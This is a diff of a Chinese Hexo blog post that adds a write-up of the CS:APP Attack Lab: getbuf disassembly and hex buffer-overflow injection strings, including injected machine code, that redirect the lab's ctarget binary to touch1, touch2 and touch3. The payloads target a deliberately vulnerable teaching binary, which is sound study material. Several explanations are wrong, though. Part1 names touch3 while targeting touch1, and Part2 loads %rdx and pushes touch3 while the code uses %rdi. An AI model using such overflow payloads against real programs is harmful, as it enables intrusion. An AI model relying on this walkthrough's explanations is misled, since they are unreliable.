@@ -6,25 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>lab3 Attack lab | Hexo</title>
+  <title>深入理解计算机系统 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
+  <meta name="description" content="lab3 Attack lab 在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
 <meta name="keywords" content="cs:app">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lab3 Attack lab">
+<meta property="og:title" content="深入理解计算机系统">
 <meta property="og:url" content="http://yoursite.com/2019/03/16/lab3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
+<meta property="og:description" content="lab3 Attack lab 在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://tu.027cgb.com/618037/lab3result3.png">
 <meta property="og:image" content="http://tu.027cgb.com/618037/mov.png">
 <meta property="og:image" content="http://tu.027cgb.com/618037/BC.png">
 <meta property="og:image" content="http://tu.027cgb.com/618037/D.png">
 <meta property="og:image" content="http://tu.027cgb.com/618037/lab3result4.png">
-<meta property="og:updated_time" content="2019-03-16T16:10:45.757Z">
+<meta property="og:updated_time" content="2019-03-17T13:04:30.332Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="lab3 Attack lab">
-<meta name="twitter:description" content="在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
-<meta name="twitter:image" content="http://tu.027cgb.com/618037/mov.png">
+<meta name="twitter:title" content="深入理解计算机系统">
+<meta name="twitter:description" content="lab3 Attack lab 在这一实验中我们会通过两种方法来完成对目标文件的攻击：   缓冲区溢出攻击：1-3小题 ROP 攻击：4，5小题">
+<meta name="twitter:image" content="http://tu.027cgb.com/618037/lab3result3.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -171,7 +172,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      lab3 Attack lab
+      深入理解计算机系统
     </h1>
   
 
@@ -184,7 +185,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>在这一实验中我们会通过两种方法来完成对目标文件的攻击：</p>
+        <h1 id="lab3-Attack-lab"><a href="#lab3-Attack-lab" class="headerlink" title="lab3 Attack lab"></a>lab3 Attack lab</h1><hr>
+<p>在这一实验中我们会通过两种方法来完成对目标文件的攻击：</p>
 <blockquote>
 <ul>
 <li>缓冲区溢出攻击：1-3小题</li>
@@ -196,7 +198,80 @@
 <p>众所周知，当程序调用函数（方法）时，会先将当前PC所指的下一条命令压入堆栈中，然后将PC置为目标函数的地址，之后程序运行跳转至目标函数。<br>当程序从函数中运行结束时，会调用ret将堆栈中之前压入的地址弹出到PC中，从而使得程序返回到主程序中。</p>
 <p>缓冲区溢出攻击便是应用了函数调用这个特点，将PC的返回位置做出更改，从而将程序跳转到我们的攻击程序中。</p>
 <hr>
-<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3><hr>
+<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>这道题目要求我们注入的代码可以调用另外一个目标函数<br>先来看看ctarget函数的流程：</p>
+<pre><code>void test() {
+    int val;
+    val = getbuf();
+    printf(&quot;NO explit. Getbuf returned 0x%x\n&quot;, val);
+}
+</code></pre><p>我们需要使用这个函数来调用下列的目标函数：</p>
+<pre><code>void touch1() {
+    vlevel = 1;
+    printf(&quot;Touch!: You called touch1()\n&quot;);
+    validate(1);
+    exit(0);
+}
+</code></pre><p>我们的代码通过getbuf()来传入，先来看看getbuf()</p>
+<pre><code>000000000040181c &lt;getbuf&gt;:
+    40181c:    48 83 ec 28          sub    $0x28,%rsp
+401820: 48 89 e7             mov    %rsp,%rdi
+401823: e8 88 02 00 00       callq  401ab0 &lt;Gets&gt;
+401828: b8 01 00 00 00       mov    $0x1,%eax
+    40182d:    48 83 c4 28          add    $0x28,%rsp
+    401831:    c3                   retq   
+    401832:    90                   nop
+    401833:    90                   nop
+</code></pre><p>可以找到getbuf堆栈段大小为40字，所以我们的注入代码长度超过40字就会发生溢出。</p>
+<p>所以在第41字处插入touch3()的地址，就可以首先跳转了。<br>二进制代码如下（注意是小端输入）:</p>
+<pre><code>00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+34 18 40 00
+</code></pre><p>记得要使用hex2raw将写的二进制(其实是16进制)的代码翻译成01代码，注入便可成功啦。</p>
+<h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>这一道题目题目提高了一些难度，要求我们不仅要调用目标函数，还要向目标函数传递我们的cookie值。</p>
+<p>所以这次我们要注入的不仅是一个地址了，还需要注入一段代码，这段代码很简单，即将我们的cookie值传递到%rdi中。<br>汇编描述如下：</p>
+<pre><code>mov cookies的值,%rdx
+push touch3地址
+ret
+</code></pre><p>我们把这两句话放在堆栈顶，第一次ret的地址即为这两句话(栈顶)，第二次ret地址为touch3。</p>
+<p>下面我们需要确定栈顶的地址为多少。</p>
+<p>使用gdb工具来调试，观察%rsp的值，便可得到。</p>
+<p>得到如下机器码：</p>
+<pre><code>48 c7 c7 ee 4f 37 45 68 
+60 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+d8 f2 60 55
+</code></pre><h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3><p>这道题目的源代码如下：</p>
+<pre><code>int hexmatch(unsigned val, char *sval){
+    char cbuf[110];
+    char *s = cbuf + random() % 100;
+    sprintf(s, &quot;%.8x&quot;, val);
+    return strncmp(sval, s, 9) == 0;
+}
+void touch3(char *sval){
+    vlevel = 3;
+    if (hexmatch(cookie, sval)){
+        printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        validate(3);
+    } else {
+        printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        fail(3);
+    }
+    exit(0);
+}
+</code></pre><p>由题目可知这一次我们需要想向touch3()函数传递一个指针值，且这个指针所指的值是一个asc码，根据asc码可以翻译得到我们的cookie值，但注意到touch3函数还会掉用另一个函数，这会导致rsp减小，很有可能破坏掉我们在栈中所存储的cookie的asc码值。</p>
+<p>所以，我们的cookie是不可以放在ret指令的上面的（不可以放在地址减小方向），而是放在ret指令的下方（地址增大的方向）。</p>
+<p>所以我们的注入代码的逻辑应该是这样的：<br>1.注入堆栈，使得堆栈溢出，修改返回指令，使程序运行到我们的注入代码段。<br>2.将我们的cookie的地址传入%rdi，调用touch3()。（注意cookie的地址比ret的地址要大）<br>3.运行touch3函数<br>翻译成二进制文件，如下：</p>
+<pre><code>48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00
+35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+</code></pre><p>运行结果如下:<br><img src="http://tu.027cgb.com/618037/lab3result3.png"></p>
+<hr>
 <h2 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h2><p>我们可以发现程序运行时如果没有合适的堆栈保护机制会使得攻击变得异常的轻松。</p>
 <p>面对这种情况rtarget做出的对堆栈的保护机制：<br>1.每次为程序分配堆栈段的地址是任意的，无法提前检查出。<br>2.PC无法执行堆栈段中的程序，如果运行便会报错，并终止程序的运行。</p>
 <p>面对这种情况，我们对程序代码进行重构，引导PC在已有程序中跳转，以将PC引导到我们的目标攻击文件中去。</p>
